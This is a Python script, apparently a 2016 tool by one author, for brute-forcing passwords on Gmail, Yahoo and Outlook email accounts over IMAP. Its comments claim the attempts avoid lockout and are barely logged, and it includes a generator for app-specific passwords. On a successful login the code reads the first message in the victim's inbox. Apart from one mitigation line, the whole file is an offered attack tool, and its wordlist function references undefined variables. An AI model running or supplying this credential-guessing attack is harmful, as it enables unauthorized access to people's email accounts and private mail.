#! python3
# imapBruteForce.py - Author: David Sullivan
# version 1.0 - Updated 12/1/2016
#
#
# This tool can be used to brute force and log in to gmail.com, yahoo.com and outlook.com
# email addresses. This does not cause account lockout
# 
# If an application specific password has been set on an account that uses 2 factor authentication,
# this tool can also be used to brute force the application specific password.
# (A function has been created with the ruleset to build a wordlist for this using the 16 character,
#   all lowercase rules used for application specific passwords. This is not ideal and it is recommended
#   that you do this outside of python/use a birthday attack wordlist for this.)
#
# Notes/Requirements for Account:
#   -Gmail: imap.gmail.com
#       -IMAP enabled
#       -Does not seem to be logged
#   -Yahoo: imap.mail.yahoo.com
#       -Allow apps that use less secure log-in (only if 2-factor is disabled)
#       -Does not seem to log activity
#   -Outlook: imap.outlook.com
#       -No special requirements, does provide logging for imap though
#
# Mitaging steps: Implement account lockout/logging on imap logins



import imapclient, backports, itertools

addressList = [] #put the target addresses here in list format e.g ['test1@test.com','test2@test.com']
wordlist = [] #put your wordlist/dictionary here in list format e.g ['test1','test2']
imapServer = [] #put your target server here in list format e.g ['imap.test.com']

def create_wordlist():
    for n in range(min_length,max_length+1):
        for word in itertools.product(alphabet, repeat=n):
            broken_list.append(word)

    for x in broken_list:
        word = ''
        for y in range(len(x)):
            word += ''.join(x[y])
        wordlist.append(word)
    return wordlist
    
def imapAttack(emails,wl,imapServerName):
    for email in emails:
        for password in wl:
            try:
                print('Trying %s' % password)
                context = backports.ssl.SSLContext(backports.ssl.PROTOCOL_TLSv1_2)
                server = imapclient.IMAPClient(imapServerName, ssl=True, ssl_context=context)
                server.login(email, password)
                print('Success! %s' % password)
                server.select_folder('INBOX')
                UIDs = server.search()
                message = server.fetch(UIDs[0], ['BODY[]'])
                print(message)
                break
            except Exception:
                continue
            
imapAttack(addressList,wordlist,imapServer)
